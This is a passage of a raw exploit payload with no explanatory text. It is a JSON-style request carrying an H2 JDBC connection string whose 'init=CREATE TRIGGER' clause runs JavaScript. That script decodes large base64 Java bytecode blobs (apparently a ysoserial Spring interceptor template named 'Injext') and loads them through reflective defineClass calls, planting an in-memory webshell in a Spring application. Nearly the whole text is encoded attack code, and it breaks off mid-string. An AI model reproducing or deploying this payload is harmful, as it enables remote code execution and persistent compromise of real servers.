0VBRnloYlFreHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bFdBUUFFYVc1cGRBRUFGeWhKVEdwaGRtRXZjMlZqZFhKcGRIa3ZTMlY1T3lsV0FRQVJhbUYyWVM5c1lXNW5MMGx1ZEdWblpYSUJBQVJVV1ZCRkFRQVJaMlYwUkdWamJHRnlaV1JOWlhSb2IyUUJBQWRrYjBacGJtRnNBUUFHS0Z0Q0tWdENBUUFRYW1GMllTOXNZVzVuTDFSb2NtVmhaQUVBRFdOMWNuSmxiblJVYUhKbFlXUUJBQlFvS1V4cVlYWmhMMnhoYm1jdlZHaHlaV0ZrT3dFQUZXZGxkRU52Ym5SbGVIUkRiR0Z6YzB4dllXUmxjZ0VBR1NncFRHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNCQUFkMllXeDFaVTltQVFBV0tFa3BUR3BoZG1FdmJHRnVaeTlKYm5SbFoyVnlPd0VBREdkbGRGQmhjbUZ0WlhSbGNnRUFLU2hiVEdwaGRtRXZibVYwTDFWU1REdE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUpjM1ZpYzNSeWFXNW5BUUFXS0VsSktVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCWGR5YVhSbEFRQUxkRzlDZVhSbFFYSnlZWGtBSVFDVEFKUUFBQUFFQUFBQWxRQ1dBQUFBQUFDWEFKWUFBQUFBQUpnQWxnQUFBQUFBbVFDYUFBQUFCZ0FCQUpzQW5BQUJBSjBBQUFCbUFBTUFBUUFBQURBcXR3QUJLaElDdFFBREtoSUV0UUFGS3JzQUJsbTNBQWNxdEFBRnRnQUlLclFBQTdZQUNMWUFDYmdBQ3JVQUM3RUFBQUFDQUo0QUFBQVNBQVFBQUFBWEFBUUFHUUFLQUJvQUVBQWJBSjhBQUFBTUFBRUFBQUF3QUtBQW9RQUFBQWtBb2dDakFBSUFuUUFBQVVvQUJnQUZBQUFBZUFGTkVneTRBQTFNS3hJT0FiWUFEeXNCdGdBUVRpMjJBQkVTRWdTOUFCTlpBeElVVTdZQUR5MEV2UUFWV1FNcVU3WUFFTUFBRnNBQUZrMm5BRHhPRWhpNEFBMU1LN1lBR1RvRUdRUzJBQkVTR2dTOUFCTlpBeElVVTdZQUR4a0VCTDBBRlZrREtsTzJBQkRBQUJiQUFCWk5wd0FGT2dRc3NBQUNBQUlBT2dBOUFCY0FQZ0J4QUhRQUZ3QURBSjRBQUFBeUFBd0FBQUFnQUFJQUlnQUlBQ01BRlFBa0FEb0FMQUE5QUNVQVBnQW5BRVFBS0FCS0FDa0FjUUFyQUhRQUtnQjJBQzBBbndBQUFFZ0FCd0FWQUNVQXBBQ2xBQU1BQ0FBMUFLWUFtZ0FCQUVvQUp3Q2tBS1VBQkFCRUFEQUFwZ0NhQUFFQVBnQTRBS2NBcUFBREFBQUFlQUNwQUpZQUFBQUNBSFlBcWdDckFBSUFyQUFBQUNvQUEvOEFQUUFEQndDdEFBY0FGZ0FCQndDdS93QTJBQVFIQUswQUJ3QVdCd0N1QUFFSEFLNzZBQUVBcndBQUFBUUFBUUFYQUFrQW1BQ3dBQUVBblFBQUFLY0FCQUFEQUFBQU1BRk1FaHU0QUJ4TkxDcTJBQjBES3JZQUhyWUFIN3NBSUZrRUxMWUFJYmNBSWhBUXRnQWp0Z0FrVEtjQUJFMHJzQUFCQUFJQUtnQXRBQmNBQXdDZUFBQUFIZ0FIQUFBQU1RQUNBRFFBQ0FBMUFCVUFOZ0FxQURnQUxRQTNBQzRBT1FDZkFBQUFJQUFEQUFnQUlnQ3hBTElBQWdBQUFEQUFzd0NXQUFBQUFnQXVBTFFBbGdBQkFLd0FBQUFUQUFML0FDMEFBZ2NBclFjQXJRQUJCd0N1QUFBSkFMVUF0Z0FDQUowQUFBRkVBQVlBQlFBQUFISUJUUklNdUFBTlRDc1NKUUcyQUE4ckFiWUFFRTR0dGdBUkVpWUV2UUFUV1FNU0ZsTzJBQTh0QkwwQUZWa0RLbE8yQUJEQUFCUk5wd0E1VGhJbnVBQU5UQ3UyQUJrNkJCa0V0Z0FSRWlnRXZRQVRXUU1TRmxPMkFBOFpCQVM5QUJWWkF5cFR0Z0FRd0FBVVRhY0FCVG9FTExBQUFnQUNBRGNBT2dBWEFEc0Fhd0J1QUJjQUF3Q2VBQUFBTWdBTUFBQUFQZ0FDQUVBQUNBQkJBQlVBUWdBM0FFb0FPZ0JEQURzQVJRQkJBRVlBUndCSEFHc0FTUUJ1QUVnQWNBQkxBSjhBQUFCSUFBY0FGUUFpQUxjQXBRQURBQWdBTWdDbUFKb0FBUUJIQUNRQXR3Q2xBQVFBUVFBdEFLWUFtZ0FCQURzQU5RQ25BS2dBQXdBQUFISUFxUUNyQUFBQUFnQndBS29BbGdBQ0FLd0FBQUFxQUFQL0FEb0FBd2NBRmdBSEFLMEFBUWNBcnY4QU13QUVCd0FXQUFjQXJRY0FyZ0FCQndDdStnQUJBSzhBQUFBRUFBRUFGd0FCQUxnQXVRQUNBSjBBQUFmR0FBY0FGQUFBQkJjckVpbTVBQ29DQUJJcnRnQXNtUVFES3pvRUxEb0ZHUVRCQUMyYUFEY1NMaEl2QTcwQUU3WUFEem9HR1FZckE3MEFGYllBRURvRUdRVEJBQzJaQUFhbkFCTVpCaGtFQTcwQUZiWUFFRG9FcC8vb0dRWEJBRENhQURjU01SSXlBNzBBRTdZQUR6b0dHUVlzQTcwQUZiWUFFRG9GR1FYQkFEQ1pBQWFuQUJNWkJoa0ZBNzBBRmJZQUVEb0ZwLy9vS3hJenVRQXFBZ0FTTkxZQUxKa0FoaXNTTkxrQUtnSUFPZ1laQnNZQWRCa0d0Z0ExbWdCc0FUb0hFamE0QURlMkFEZ1NPYllBT3BrQUd3YTlBQlJaQXhJMFUxa0VFanRUV1FVWkJsTTZCNmNBR0FhOUFCUlpBeEk4VTFrRUVqMVRXUVVaQmxNNkI3c0FQbG00QUQ4WkI3WUFRTFlBUWJjQVFoSkR0Z0JFdGdCRk9nZ1pCY0FBTUxZQVJoa0l0Z0JIcHdMd0t4SXp1UUFxQWdBU1NMWUFMSmtCNWl1NUFFa0JBQkpLdGdCTG1RTFN1d0JNV2JjQVRUb0dHUVRBQUMyMkFFNDZCeGtHRWs4WkJMWUFVRmNaQmhKUkdRVzJBRkJYR1FZU1Voa0h0Z0JRVnl1NUFGTUJBTFlBVkRvSUdRakdBQXNaQ0xZQU5aa0E5QkpWT2dnWkJMWUFFUkpQdGdCV09na1pDUVMyQUZjWkNSa0V0Z0JZd0FCWk9nb1pDcllBRVJKYXRnQldPZ3NaQ3dTMkFGY1pDeGtLdGdCWXdBQmJPZ3daRExZQVhEb05HUTIyQUJFU1hiWUFWam9PR1E0RXRnQlhHUTRaRGJZQVdNQUFYam9QR1ErMkFGKzVBR0FCQURvUUdSQzVBR0VCQUprQWVSa1F1UUJpQVFEQUFHTTZFUmtSdVFCa0FRREFBQlFTWlJKbXRnQm5PaElaRWJrQWFBRUF3QUJwT2hNWkU3WUFhcG9BSExzQUJsbTNBQWNaQ0xZQUNCa1N0Z0FJdGdBSk9naW5BQ3E3QUFaWnR3QUhHUWkyQUFnWkVyWUFDQkpydGdBSUdSTUR0Z0Jzd0FBVXRnQUl0Z0FKT2dpbi80TVNBam9KR1FjU2JSa0p1UUJ1QXdBU2I3Z0FjRG9LR1FvRnV3QnhXUmtKdGdBZEVtKzNBSEsyQUhNU2RMZ0FEUkoxQnIwQUUxa0RFaFpUV1FTeUFIWlRXUVd5QUhaVHRnQjNPZ3NaQ3dTMkFIZ1pDcnNBZVZtM0FIb1pDTFlBZTdZQWZEb01HUXU0QUgyMkFINEd2UUFWV1FNWkRGTlpCQU80QUg5VFdRVVpETDY0QUg5VHRnQVF3QUFUT2cwWkRiWUFHUmtHdGdDQVY2Y0EvU3NTTTdrQUtnSUFFb0cyQUN5WkFPMHJLclFBQmJrQWdnSUF1QUNET2dZcUdRWUR0Z0NFT2dZcXRBQ0Z4d0JrdXdDR1dRTzlBSWU0QUgyMkFINjNBSWc2QnhLSkVuVUd2UUFUV1FNU0ZsTlpCTElBZGxOWkJiSUFkbE8yQUhjNkNCa0lCTFlBZUNvWkNCa0hCcjBBRlZrREdRWlRXUVFEdUFCL1Uxa0ZHUWErdUFCL1U3WUFFTUFBRTdVQWhhY0FiYnNBaWxtM0FJczZCeXEwQUlXMkFCazZDQmtJR1FlMkFJQlhHUWdaQnJZQWdGY1pDQ3UyQUlCWExMa0FqQUVBS3JRQUN3TVFFTFlBamJZQWpoa0l0Z0NQVnl5NUFJd0JBQ29aQjdZQWtBUzJBSVM0QUpHMkFJNHN1UUNNQVFBcXRBQUxFQkMyQUpLMkFJNERyS2NBQlRvRUJLd0FBUUFBQkE4RUV3QVhBQVFBbmdBQUFVNEFVd0FBQUZJQUVBQlRBQk1BVkFBV0FGY0FIZ0JZQUNzQVdRQTNBRnNBUWdCY0FGSUFZQUJhQUdFQVp3QmlBSE1BWkFCK0FHVUFqZ0JwQUo0QWFnQ29BR3NBdFFCc0FMZ0FiUURJQUc0QTRBQndBUFVBY2dFUkFITUJIZ0IxQVRFQWRnRS9BSGdCU0FCN0FWSUFmQUZjQUgwQlpnQitBWEFBZ0FGN0FJRUJpQUNDQVl3QWhBR1lBSVVCbmdDR0Fhb0FpQUcyQUlrQnZBQ0tBY2dBaXdIUEFJd0Iyd0NOQWVFQWpnSHRBSkFCK1FDUkFnTUFrZ0lQQUpNQ0lnQ1VBaTRBbFFJMkFKWUNUd0NZQW5ZQW1nSjVBSjhDZlFDZ0FvZ0FvUUtQQUtJQ293Q2pBc1FBcEFMS0FLVUMzUUNtQXdZQXB3TVJBS2dERkFDcEF5UUFxd016QUt3RFBBQ3RBME1BcmdOV0FLOERkQUN3QTNvQXNRT2hBTElEcEFDekE2MEF0QU8yQUxVRHZnQzJBOFlBdHdQTkFMZ0Q0QUM1QStZQXVnUDhBTHNFRGdDK0JCQUF3Z1FUQU1BRUZRRERBSjhBQUFGZ0FDTUFLd0FuQUxvQXV3QUdBR2NBSndDOEFMc0FCZ0M0QUdZQXZRQytBQWNCRVFBTkFMOEFsZ0FJQUtnQWRnREFBSllBQmdJUEFHY0F3UURFQUJFQ0lnQlVBTVVBbGdBU0FpNEFTQURHQU1jQUV3R1lBT0VBeUFESkFBa0JxZ0RQQU1vQXl3QUtBYllBd3dETUFNa0FDd0hJQUxFQXpRRE9BQXdCendDcUFNOEEwQUFOQWRzQW5nRFJBTWtBRGdIdEFJd0EwZ0RUQUE4QitRQ0FBTlFBMVFBUUFVZ0J5UURXQU5jQUJnRlNBYjhBMkFEWkFBY0Jld0dXQUprQWxnQUlBbjBBbEFEYUFKWUFDUUtQQUlJQTJ3RGNBQW9DeEFCTkFOMEF1d0FMQXQwQU5BRGVBS3NBREFNR0FBc0Ezd0NhQUEwRFZnQkxBT0FBNFFBSEEzUUFMUURpQUxzQUNBT3RBR0VBNHdEa0FBY0R0Z0JZQU9VQXBRQUlBek1BMndEbUFLc0FCZ0FUQS8wQTV3Q2xBQVFBRmdQNkFPZ0FwUUFGQUFBRUZ3Q2dBS0VBQUFBQUJCY0E2UURxQUFFQUFBUVhBT3NBN0FBQ0FBQUVGd0R0QUtVQUF3RHVBQUFBSUFBREFnOEFad0RCQU84QUVRSXVBRWdBeGdEd0FCTUIrUUNBQU5RQThRQVFBS3dBQUFDMUFCWCtBRGNIQVBJSEFQSUhBUE1LK2dBUC9BQWdCd0R6Q3ZvQUQvMEFVUWNBclFjQTlCVDVBQ2dDL2dCbUJ3RDFCd0QyQndDdC93QndBQkVIQVBjSEFQZ0hBUGtIQVBJSEFQSUhBUElIQVBVSEFQWUhBSzBIQVBvSEFQc0hBUG9IQVB3SEFQMEhBUG9IQVA0SEFQOEFBUDRBVlFjQkFBY0FyUWNCQWZnQUp2OEFBZ0FKQndEM0J3RDRCd0Q1QndEeUJ3RHlCd0R5QndEMUJ3RDJCd0N0QUFENEFKcjhBSThIQUJiNkFHbjVBQUZDQndDdUFRQ3ZBQUFBQkFBQkFCY0FBUUVDQVFNQUFRQ2RBQUFBMkFBR0FBUUFBQUFzRW0rNEFIQk9MUnlaQUFjRXB3QUVCYnNBY1ZrcXRBQUR0Z0FkRW0rM0FISzJBSE10SzdZQWZMQk9BYkFBQVFBQUFDZ0FLUUFYQUFNQW5nQUFBQllBQlFBQUFNZ0FCZ0RKQUNNQXlnQXBBTXNBS2dETUFKOEFBQUEwQUFVQUJnQWpBTnNBM0FBREFDb0FBZ0NuQUtnQUF3QUFBQ3dBb0FDaEFBQUFBQUFzQUxNQXF3QUJBQUFBTEFDeEFRUUFBZ0NzQUFBQVBBQUQvd0FQQUFRSEFQY0hBQllCQndFRkFBRUhBUVgvQUFBQUJBY0E5d2NBRmdFSEFRVUFBZ2NCQlFIL0FCZ0FBd2NBOXdjQUZnRUFBUWNBcmdBQ0FRWUFBQUFDQVFjQXd3QUFBQW9BQVFCakFXa0F3Z1lKAQA7b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuc2VydmxldC5zdXBwb3J0LlJlcXVlc3RDb250ZXh0VXRpbHMMAIoAiwEAD2phdmEvbGFuZy9DbGFzcwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QMAIwAjQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BABlmaW5kV2ViQXBwbGljYXRpb25Db250ZXh0AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAcAiQwAjgCPAQAQamF2YS9sYW5nL09iamVjdAcAkAwAkQCSAQBAb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1NlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwwAkwCUDACVAJYBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dAEAUm9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQubXZjLm1ldGhvZC5hbm5vdGF0aW9uLlJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcMAJcAmAEAPm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQAob3JnL3NwcmluZ2ZyYW1ld29yay9iZWFucy9CZWFuc0V4Y2VwdGlvbgEATm9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQubXZjLmFubm90YXRpb24uRGVmYXVsdEFubm90YXRpb25IYW5kbGVyTWFwcGluZwwAmQCaBwCbDACcAJ0BABNqYXZhL3V0aWwvQXJyYXlMaXN0AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwAngCfDACgAKEHAKIMAKMApAwApQCmAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nBwCnDACoADoBADZ5c29zZXJpYWwucGF5bG9hZHMudGVtcGxhdGVzLlNwcmluZ0ludGVyY2VwdG9yVGVtcGxhdGUMAKkAqgwAqwCLDACsAK0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAGSW5qZXh0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAJbG9hZENsYXNzAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaACEALAANAAAAAAACAAEALQAuAAEALwAAADMAAQABAAAABSq3AAGxAAAAAgAwAAAACgACAAAAMAAEADIAMQAAAAwAAQAAAAUAMgAzAAAACAA0AC4AAQAvAAAC4gAGAAoAAAEOEgJLEgO4AAROLRIFBL0ABlkDEgdTtgAITKcAFToELRIKBL0ABlkDEgtTtgAITCsEtgAMKwEEvQANWQO4AA7AAA+2ABBTtgARwAASOgQSE7gABDoFGQQZBbkAFAIAwAAVTacAGToFEhe4AAQ6BhkEGQa5ABQCAMAAFU0SFRIYtgAZOgUZBQS2ABoZBSy2ABvAABw6BhIdtgAewAAdKrYAHzoHuAAgtgAhOggSIhIjB70ABlkDEiRTWQQSJVNZBbIAJlNZBrIAJlO2AAg6CRkJBLYADBkJGQgHvQANWQMSJ1NZBBkHU1kFA7gAKFNZBhkHvrgAKFO2ABFXGQYZCBIntgAptgAetgAqV6cABE6xAAMACQAZABwACQBNAGEAZAAWAAMBCQEMACsABAAwAAAAagAaAAAAEQADABUACQAXABkAGgAcABgAHgAZAC4AGwAzABwATQAeAFQAHwBhACMAZAAgAGYAIQBtACIAegAkAIMAJQCJACYAlAAnAKIAKACqACkAzQAqANMAKwD5ACwBCQAuAQwALQENAC8AMQAAAKIAEAAZAAMANQA2AAEAHgAQADcAOAAEAFQADQA5ADoABQBhAAMAOwA8AAIAbQANAD0AOgAGAGYAFAA+AD8ABQAJAQAAQAA6AAMATQC8AEEAQgAEAIMAhgBDAEQABQCUAHUARQBGAAYAogBnAEcASAAHAKoAXwBJAEoACADNADwASwA2AAkALgDeADUANgABAHoAkgA7ADwAAgADAQoATABNAAAATgAAACoABABUAA0AOQBPAAUAbQANAD0ATwAGAAkBAABAAE8AAwCUAHUARQBQAAYAUQAAAGIABv8AHAAEBwBSAAAHAFMAAQcAVP8AEQAEBwBSBwBVAAcAUwAA/wA1AAUHAFIHAFUABwBTBwBWAAEHAFf/ABUABQcAUgcAVQcAWAcAUwcAVgAA/wCRAAEHAFIAAQcAWfoAAAABAFoAAAACAFs='\\\\;var bytecode\\\\;try{var clsBase64 = classLoader.loadClass('java.util.Base64')\\\\;var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder')\\\\;var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz)\\\\;bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64)\\\\;} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter')\\\\;bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64)\\\\;} catch (eee) {var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder')\\\\;bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64)\\\\;}}var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader')\\\\;var clsByteArray = (new java.lang.String('a').getBytes().getClass())\\\\;var clsInt = java.lang.Integer.TYPE\\\\;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt])\\\\;defineClass.setAccessible(true)\\\\;var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length))\\\\;clazz.newInstance()\\\\;}$$&quot;,&quot;dbUsername&quot;:&quot;root&quot;,&quot;dbPassword&quot;:&quot;root&quot;} H2 Spring jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\nvar classLoader = java.lang.Thread.currentThread().getContextClassLoader()\\\\;try{classLoader.loadClass('Injext').newInstance()\\\\;}catch (e){var clsString = classLoader.loadClass('java.lang.String')\\\\;var bytecodeBase64 = 'yv66vgAAADQArgoADQBcCABdCABeCgAGAF8IADUHAGAHAGEKAAYAYgcAYwgAZAcAZQoAZgBnBwBoCgBpAGoHAGsKAA8AbAoAZgBtBwBuCABvCwASAHAHAHEHAHIIAHMIAEUKAAYAdAoAdQBnCgB1AHYHAHcHAHgKAAYAeQoAHQB6CgB7AHwKAHsAfQcAfggAfwcAgAcASAkAgQCCCACDCgCBAIQKACIAhQoAHACGBwCHBwCIAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhMSW5qZXh0OwEACDxjbGluaXQ+AQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0AQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAcUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAWYWJzdHJhY3RIYW5kbGVyTWFwcGluZwEAQExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyTWFwcGluZzsBAB9EZWZhdWx0QW5ub3RhdGlvbkhhbmRsZXJNYXBwaW5nAQACZTIBACpMb3JnL3NwcmluZ2ZyYW1ld29yay9iZWFucy9CZWFuc0V4Y2VwdGlvbjsBABNSZXF1ZXN0Q29udGV4dFV0aWxzAQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABNhZGFwdGVkSW50ZXJjZXB0b3JzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAFYnl0ZXMBAAJbQgEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAJtMAEAA2I2NAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAKUxqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQANU3RhY2tNYXBUYWJsZQcAgAcAYAcAYwcAiQcAbgcAcgcAcQcAhwEAClNvdXJjZUZpbGUBAAtJbmpleHQuamF2YQwALQAuATMkeXY2NnZnQUFBRFFDRGdvQWxBRUlDQUVKQ1FDVEFRb0lBSmNKQUpNQkN3Y0JEQW9BQmdFSUNnQUdBUTBLQUFZQkRnb0Frd0VQQ1FDVEFSQUlBUkVLQUJNQkVnZ0JFd29BRXdFVUNnRVZBUllLQUJVQkZ3Z0JHQWNCR1FjQkdnY0JHd2NBcXdjQkhBZ0JIUW9BRXdFZUNBRWZDQUVnQ2dFaEFTSUtBQlFCSXdvQUZBRWtDZ0VoQVNVSEFTWUtBU0VCSndvQUlBRW9DZ0FnQVNrS0FCUUJLZ2dCS3dnQkxBZ0JMUWdCTGdnQkx3c0JNQUV4Q0FFeUNnQVVBVE1IQVRRSEFUVUlBTG9IQVRZSEFUY0lBTHdJQVRnSUFNQUtBQlFCT1FnQk9nb0JPd0U4Q2dBVUFUMElBVDRLQUJRQlB3Z0JRQWdCUVFnQlFnY0JRd29CUkFGRkNnRkVBVVlLQVVjQlNBb0FQZ0ZKQ0FGS0NnQStBVXNLQUQ0QlRBb0FNQUZOQ2dGT0FVOElBVkFMQVRBQlVRZ0JVZ29BRkFGVEJ3RlVDZ0JNQVFnS0FDMEJWUWdBNlFvQVRBRldDQURyQ0FEWUN3RXdBVmNLQVZnQldRZ0JXZ29BRXdGYkNnRmNBVjBLQVZ3QlhnY0JYd2dBelFjQllBb0FXd0ZoQ0FEUkJ3RmlDZ0JlQVdNTEFXUUJaUXNCWmdGbkN3Rm1BV2dIQVdvTEFHTUJhd2dCYkFnQmJRb0FGQUZ1Q3dCakFXOEhBWEFLQUdrQmNRZ0JjZ29BYVFGekNBRjBDd0YxQVhZSUFYY0tBWGdCZVFjQmVnb0FjUUY3Q2dGNEFYd0lBWDBJQVg0SkFYOEJnQW9BRXdHQkNnRVZBVjBIQVlJS0FIa0JDQW9BZVFHRENnRjRBWVFLQVlVQmhnb0JoUUdIQ2dGL0FZZ0tBQlVCVXdnQmlRc0JNQUdLQ2dDVEFZc0tBSk1CakFrQWt3R05Cd0dPQndHUENnQ0dBWkFIQVpFSEFaSUtBSW9CQ0FzQmt3Rk5DZ0FVQVpRS0FVNEJsUW9BRlFFT0NnQ0tBWllLQUpNQmx3b0FGQUdZQndHWkJ3R2FBUUFDZUdNQkFCSk1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQVJ3WVhOekFRQURiV1ExQVFBSGNHRjViRzloWkFFQUVVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUdQR2x1YVhRK0FRQURLQ2xXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQURoTWVYTnZjMlZ5YVdGc0wzQmhlV3h2WVdSekwzUmxiWEJzWVhSbGN5OVRjSEpwYm1kSmJuUmxjbU5sY0hSdmNsUmxiWEJzWVhSbE93RUFER0poYzJVMk5FUmxZMjlrWlFFQUZpaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXMElCQUFka1pXTnZaR1Z5QVFBU1RHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQUdZbUZ6WlRZMEFRQUJaUUVBRlV4cVlYWmhMMnhoYm1jdlJYaGpaWEIwYVc5dU93RUFBbUp6QVFBRmRtRnNkV1VCQUFKYlFnRUFEVk4wWVdOclRXRndWR0ZpYkdVSEFSb0hBUndCQUFwRmVHTmxjSFJwYjI1ekFRQW1LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFGdEFRQWRUR3BoZG1FdmMyVmpkWEpwZEhrdlRXVnpjMkZuWlVScFoyVnpkRHNCQUFGekFRQURjbVYwQVFBTVltRnpaVFkwUlc1amIyUmxBUUFXS0Z0Q0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCMFZ1WTI5a1pYSUJBQWx3Y21WSVlXNWtiR1VCQUdRb1RHcGhkbUY0TDNObGNuWnNaWFF2YUhSMGNDOUlkSFJ3VTJWeWRteGxkRkpsY1hWbGMzUTdUR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGMzQnZibk5sTzB4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsYUFRQUtaMlYwVW1WeGRXVnpkQUVBR2t4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBTFoyVjBVbVZ6Y0c5dWMyVUJBQVJqYldSekFRQVRXMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBQm5KbGMzVnNkQUVBQTJOdFpBRUFCRzVsZUhRQkFBVkZiblJ5ZVFFQURFbHVibVZ5UTJ4aGMzTmxjd0VBRlV4cVlYWmhMM1YwYVd3dlRXRndKRVZ1ZEhKNU93RUFDSEJoY21GdFMyVjVBUUFPY0dGeVlXMVdZV3gxWlV4cGMzUUJBQlZNYW1GMllTOTFkR2xzTDBGeWNtRjVUR2x6ZERzQkFBVm1hV1ZzWkFFQUdVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOUdhV1ZzWkRzQkFBdHlaV0ZzVW1WeGRXVnpkQUVBSjB4dmNtY3ZZWEJoWTJobEwyTmhkR0ZzYVc1aEwyTnZibTVsWTNSdmNpOVNaWEYxWlhOME93RUFFbU52ZVc5MFpWSmxjWFZsYzNSR2FXVnNaQUVBRFdOdmVXOTBaVkpsY1hWbGMzUUJBQnRNYjNKbkwyRndZV05vWlM5amIzbHZkR1V2VW1WeGRXVnpkRHNCQUFwd1lYSmhiV1YwWlhKekFRQW9URzl5Wnk5aGN